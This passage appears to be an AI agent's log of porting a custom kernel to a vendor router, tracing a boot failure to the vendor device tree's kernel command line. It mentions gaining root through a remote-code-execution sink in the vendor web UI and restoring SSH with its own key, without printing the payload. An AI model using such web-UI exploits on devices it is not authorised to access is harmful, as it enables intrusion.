    (a) u-boot REFUSED kernela (our kernel) and fell through
        -> our kernel NEVER RAN; C18 would still read 0xA5A5A5A5

    (b) our kernel RAN and the platform reverted it
        -> C18 would hold a crumb (0xC0DE0004, 0xC0DE502D, or similar)

    (c) the reboot never happened - the box continued running and only the flash landed
        -> C18 would still read 0xA5A5A5A5, and the vendor stack is simply the ORIGINAL system

**Every branch is distinguished by C18, and C18 needs a shell.** What I CAN rule out:

    - the flash DID land: `kernela read back: 00f338a74c92bb9f054a689d98b007f1 BYTE-EXACT`
      was verified BEFORE the reboot, so the write completed;
    - the board is not in recovery mode (the ARP MAC is the vendor one);
    - the board is not bricked - it serves the vendor UI normally.

**What I cannot rule out: (a) vs (b) vs (c).** They are the difference between "the bootfip gate
rejected our kernel on THIS attempt", "our kernel ran and was reverted", and "we never rebooted".

## THE HONEST POSITION

The mechanism work is unaffected - the gate, the r4 fix, the VMSPLIT_2G address, the UBI compat and the
initcall ordering all remain verified from the bytes. What this fire did NOT produce is a reading,
because the access channel that produces readings was closed by the recovery that enabled the fire.

**The next action is one step, and it needs the user**: reopen access (current password / factory reset /
complete the wizard in a browser), then read C18 over a re-laid shell.

**I did not guess or brute-force the credential** - the two in `.omo-secrets` were tried in the
protocol-correct forms and rejected, and that is the honest limit of what I can do from the host.

## THE USER'S FACTORY RESET REOPENED THE DOOR

The user performed the ordinary factory reset (RESET held ~10 s with power on). The board went DOWN at
22 s and came back at 83 s. **The salt CHANGED** - `222f6c90fb182811...` -> `593fb71c17dd3919...` - which
is the proof that the password database really had been re-seeded, and why nothing I tried could work.

**And the post-reset page was the SETUP WIZARD, not a login:**

    Create an administrator password
    To secure your device, please create an administrator password. At least 8 characters long

Fields: `_csrf, salt, zonename, timeclock, luci_username, luci_password` (hidden) + `luci_password2`
(the input). **NO TOKEN FIELD** - which matches the record's single-hash recipe exactly.

    POST /cgi-bin/luci/admin/wizard  with  luci_password = sha256(pw + salt)
        -> HTTP/1.1 302 Found
        -> Set-Cookie: sysauth=2ac7483b1c334fc664c141b2e56457cc; path=/cgi-bin/luci/; HttpOnly

**So I set the password myself** (kept the project's convention so the record stays true), then:
    - RCE via the systime sink, **proven by side effect** (a marker file fetched back with 200)
    - dropbear restored (host keys regenerated, project key into BOTH authorized_keys,
      `start-stop-daemon -S -x /usr/sbin/dropbear -- -p 22 -R`) -> port 22 UP
    - ssh key login works

## ★★★★★ THE VERDICT FIRE 23 OWED

    C18 (the crumb cell) : **0xC0DE502D**
    C1C (its partner)    : 0x00000000
    boot_reg             : 11
    kernela md5          : 00f338a74c92bb9f054a689d98b007f1   <-- **STILL OUR KERNEL**
    kernelb md5          : ba868bd449631964525fd620b5480646   (stock)
    release              : 2.4.15 (vendor stack)
    cmdline              : noinitrd cma=0 console=ttyS0,115200 earlycon maxcpus=2 nr_cpus=2 additional_cpus=1

**THE RECORD'S OWN LEGEND: `C18 = 0xc0de502d, C1C = tick count` = "the timer ran, this many times".**

**Our kernel RAN on FIRE 23.** It did not sit at a poison-intact 0xA5A5A5A5 - it executed far enough to
reach timer initialisation. Branch (b) of PHASE 139 is the answer, and branches (a) and (c) are refuted.

**AND the factory reset did NOT touch kernela** - our kernel is still in the slot, and boot_reg reads 11,
meaning the A pair (kernela) BOOTED. So the platform booted our kernel, our kernel ran to the timer, and
THEN the boot failed and the vendor stack came up.

## ★★★★★ THE ROOT CAUSE OF THE "REVERT", READ FROM THE KERNEL SOURCE

    drivers/of/fdt.c, early_init_dt_scan_chosen():

        p = of_get_flat_dt_prop(node, "bootargs", &l);
        if (p != NULL && l > 0)
                strlcpy(data, p, min(l, COMMAND_LINE_SIZE));      <- the DT's cmdline FIRST
    #ifdef CONFIG_CMDLINE
    #if defined(CONFIG_CMDLINE_EXTEND)
        strlcat(data, " ", COMMAND_LINE_SIZE);
        strlcat(data, CONFIG_CMDLINE, COMMAND_LINE_SIZE);         <- OURS APPENDED AFTER
    #endif
    #endif

and our build's config:

    CONFIG_CMDLINE="panic=5 ubi.mtd=upgrade ubi.block=0,0 root=/dev/ubiblock0_0 rootfstype=squashfs init=/sbin/init"
    CONFIG_CMDLINE_EXTEND=y

**The device tree the kernel receives is THE VENDOR'S** - `dtb-base.dtb` + `dtb-ov1` + `dtb-ov2`,
assembled by `bootfip`. Our own DTS is not in that chain at all. And `dtb-base.dtb` carries, in its
`/chosen` node:

    noinitrd cma=0 console=ttyS0,115200 earlycon maxcpus=2 nr_cpus=2 additional_cpus=1

- **verified as the EXACT string at 0x5700 in dtb-base.dtb**, and verified LIVE as
  `/proc/device-tree/chosen/bootargs` on the running vendor system.

**So our kernel's effective command line is the vendor's string with ours appended.**
The vendor DT also supplies the partition labels (`pupgrade`, `prootfsa`, `pkernela`, ...), so
`ubi.mtd=upgrade` does resolve - the cmdline is not obviously broken.

## WHAT THIS CHANGES - THE HYPOTHESIS IS NOW SHARP AND SINGLE-VARIABLE

The previous account was "the platform reverts our kernel for an unknown reason". The account now is:
**our kernel runs (proven by the crumb) but never brings the system up, and the one input we have never
controlled is the CMDLINE - which the vendor DT owns and which we only APPEND to.**

`CONFIG_CMDLINE_FORCE=y` would make our cmdline WIN instead of being appended. **That is a single,
isolated, one-line change** whose prediction is testable in one fire:

    with FORCE=y  ->  predict the kernel mounts /dev/ubiblock0_0 from the owrt volume and reaches
                      userspace (dropbear answers on 22), because `root=`, `ubi.mtd=` and
                      `ubi.block=` are now exactly ours rather than trailing a vendor string that
                      also carries `noinitrd`, `cma=0`, `earlycon` and a `maxcpus=2 nr_cpus=2` clamp.

**Nothing else is changed in that variant** - same kernel source, same r4 fix, same VMSPLIT_2G, same
container. One config symbol.

## EVIDENCE HYGIENE

The log ring at `0x80602000` reads `0x66CC66CC` throughout - the filler pattern the record already
identifies as "the vendor's boot overwrote it". **So the crumb is the only surviving evidence of FIRE 23,
and it is unambiguous.**


## PHASE 143 (2026-10-12): THE CMDLINE_FORCE VARIANT - BUILT AND VERIFIED AT THE INSTRUCTION LEVEL

## THE CHANGE, ISOLATED TO ONE CONFIG SYMBOL

`build/tmp/build-cmdf.sh` is `build-r4fix.sh` with exactly one edit:

    ./scripts/config --disable CMDLINE_EXTEND
    ./scripts/config --enable  CMDLINE_FORCE

**Everything else identical**: same `.config.good`, same KERNEL_XZ, same VMSPLIT_2G + PAGE_OFFSET,
same patched head.S files, same TEXT_OFFSET=0x608000, same container tail.

## THE BUILD

    sanity PAGE_OFFSET=0x80000000
    sanity VMSPLIT2G=1
    sanity CMDLINE=present
    sanity FORCE=1 EXTEND=0                 <- the change
    vmlinux entry: 0x80608000               <- correct link address

    cmdf-uImage 2,642,632 B  md5 64403425ee4ce7f0790271754b74bc5f
    cmdf-slot  8650752 B  md5 2308b34d8548db6485b6b085102d739e

## ★ THE VERIFICATION THAT MATTERS (and two false alarms I caught)

**False alarm 1 - "30% of the image differs".** I byte-diffed the two slot images and found 2,635,298
differing bytes. That is MEANINGLESS: the zImage is XZ-compressed, so one changed symbol recompresses
the whole stream. A byte-diff between compressed artifacts cannot show how small the source change was.

**False alarm 2 - "our cmdline strings are not in the image".** I grepped the slot image for
`ubi.mtd=upgrade`, `root=/dev/ubiblock0_0`, `init=/sbin/init` and found NONE - which looked like a
broken build. **It is the same compression fact**: strings are not greppable inside XZ. Checked against
the UNCOMPRESSED `vmlinux` instead:

    strings vmlinux | grep 'ubi.mtd=upgrade'
      -> panic=5 ubi.mtd=upgrade ubi.block=0,0 root=/dev/ubiblock0_0 rootfstype=squashfs init=/sbin/init

**The cmdline IS in the kernel.** Both alarms were my probes, not the artifact - the recurring lesson.

## ★★ THE DECISIVE PROOF: THE FORCE BRANCH IS COMPILED, NOT THE EXTEND BRANCH

The source at `drivers/of/fdt.c:early_init_dt_scan_chosen()` generates different CALLS per branch:

    EXTEND : strlcat(data, " "); strlcat(data, CONFIG_CMDLINE)   <- APPEND
    FORCE  : strlcpy(data, CONFIG_CMDLINE)                       <- COPY (overwrites)

`objdump -d vmlinux` around the symbol:

    80e1ce74:  bl  8097846c <strlcpy>     <- the DT bootargs
    80e1ce84:  bl  8097846c <strlcpy>     <- OUR cmdline, as a COPY

**TWO strlcpy AND ZERO strlcat.** The FORCE path is what was compiled - so on the next boot the kernel
will take OUR command line verbatim instead of appending it to the vendor DT's string.

## THE SINGLE-VARIABLE PREDICTION FOR FIRE 24

Fire `build/tmp/cmdf/cmdf-slot.bin` into `kernela` with the `owrt` volume present (it was re-confirmed
present and MOUNT-OK). **Prediction: the kernel now boots with exactly**

    panic=5 ubi.mtd=upgrade ubi.block=0,0 root=/dev/ubiblock0_0 rootfstype=squashfs init=/sbin/init

**so it attaches the owrt volume, builds ubiblock0_0, mounts the soft-float OpenWrt rootfs, and runs
`/sbin/init` - i.e. dropbear answers on port 22 and the box is REACHABLE ON OUR OWN KERNEL.** The
falsifier is equally sharp: if `C18` again shows `0xC0DE502D` and the box again comes back on the vendor
stack with 22 closed, then the cmdline was NOT the blocker and the failure is downstream of it.
